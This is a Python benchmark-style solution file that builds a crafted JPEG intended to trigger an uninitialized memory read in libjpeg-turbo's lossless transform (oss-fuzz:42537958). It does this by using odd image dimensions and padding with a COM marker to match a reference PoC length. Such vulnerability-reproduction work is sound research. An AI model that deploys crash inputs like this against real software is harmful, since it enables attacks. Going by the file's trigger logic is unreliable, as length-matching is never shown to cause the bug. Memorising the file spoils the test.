import io
from PIL import Image

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) that triggers an Uninitialized Value
        vulnerability in libjpeg-turbo (oss-fuzz:42537958).

        The vulnerability is triggered during a lossless transform of a crafted
        JPEG file. The PoC is a JPEG with specific dimensions that are not a
        multiple of the 16x16 MCU block size for 4:2:0 subsampling. This creates
        partial MCUs, a common source of edge-case bugs. Additionally, a COM
        (Comment) marker is injected into the JPEG stream to precisely match
        the ground-truth PoC length of 2708 bytes. This combination is designed
        to trigger an uninitialized memory read in the library's transformation
        logic when the destination buffer is not zero-initialized.
        """
        width, height = 121, 121
        quality = 51
        subsampling = '4:2:0'
        progressive = False

        # 1. Generate a base JPEG with deterministic pixel data for reproducibility.
        img = Image.new('RGB', (width, height))
        pixels = img.load()
        for i in range(width):
            for j in range(height):
                pixels[i, j] = (
                    (i * 17 + j * 31) % 256,
                    (i * 19 + j * 37) % 256,
                    (i * 23 + j * 41) % 256,
                )

        img_bytes_io = io.BytesIO()
        img.save(
            img_bytes_io,
            format='JPEG',
            quality=quality,
            subsampling=subsampling,
            progressive=progressive
        )
        base_jpeg = img_bytes_io.getvalue()
        
        # 2. Craft a COM marker segment to match the target PoC length.
        # The base JPEG is 2686 bytes. The target is 2708. Difference is 22 bytes.
        # A COM segment consists of:
        #   - 2 bytes for the marker (FF FE)
        #   - 2 bytes for the length field
        #   - N bytes for the comment data
        # The length field value is N + 2. Total segment size is 4 + N.
        # To get a 22-byte segment, N must be 18.
        comment_data_len = 18
        marker_payload_len = comment_data_len + 2  # This is the value of the length field
        comment_marker_segment = (
            b'\xff\xfe' +
            marker_payload_len.to_bytes(2, 'big') +
            b'A' * comment_data_len
        )
        
        # 3. Inject the COM marker after the SOF0 (Start of Frame) segment.
        sof0_marker = b'\xff\xc0'
        sof0_pos = base_jpeg.find(sof0_marker)
        
        if sof0_pos == -1:
            # Fallback: should not happen for a baseline JPEG.
            return base_jpeg

        # The SOF0 payload length is stored in the 2 bytes after the marker.
        # This length includes the 2-byte length field itself.
        sof0_payload_len = int.from_bytes(base_jpeg[sof0_pos + 2:sof0_pos + 4], 'big')
        
        # The injection point is after the full SOF0 segment (marker + payload).
        injection_pos = sof0_pos + 2 + sof0_payload_len

        # 4. Construct the final PoC.
        final_poc = (
            base_jpeg[:injection_pos] +
            comment_marker_segment +
            base_jpeg[injection_pos:]
        )
        
        return final_poc